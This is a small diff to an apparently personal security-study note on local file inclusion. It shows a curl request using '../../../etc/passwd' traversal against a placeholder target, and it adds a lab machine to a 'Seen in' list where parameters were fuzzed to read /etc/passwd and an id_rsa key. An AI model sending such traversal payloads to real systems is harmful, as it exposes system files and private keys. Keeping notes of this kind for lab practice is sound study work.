@@ -30,4 +30,4 @@ curl -s "http://TARGET/index.php?param=../../../etc/passwd"
 
 ## Seen in
 
-[[hannah-coffee]] (`?studio=../../../etc/passwd`), [[psycho]] (`?secret=` → `/etc/passwd` and `id_rsa`)
+[[hannah-coffee]] (`?studio=../../../etc/passwd`), [[psycho]] (`?secret=` → `/etc/passwd` and `id_rsa`), [[littlepivoting]] (`?archivo=` → `/etc/passwd`, fuzzed with [[ffuf]] `LFI-Jhaddix.txt`)
